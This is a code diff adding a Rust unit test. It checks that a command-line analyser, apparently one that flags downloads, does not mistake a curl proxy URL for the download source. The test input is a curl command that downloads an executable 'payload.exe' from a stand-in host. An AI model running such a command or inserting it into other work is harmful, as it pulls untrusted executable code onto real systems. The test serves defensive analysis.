@@ -6671,6 +6671,29 @@ mod curl_tests {
             env.traits
         );
     }
+
+    #[test]
+    fn curl_short_proxy_url_does_not_become_download_src() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "curl -x http://proxy.example:8080 -o out.exe https://curl-actual.example/payload.exe",
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![("https://curl-actual.example/payload.exe", Some("out.exe"))],
+            "traits: {:?}",
+            env.traits
+        );
+    }
 }
 
 #[cfg(test)]
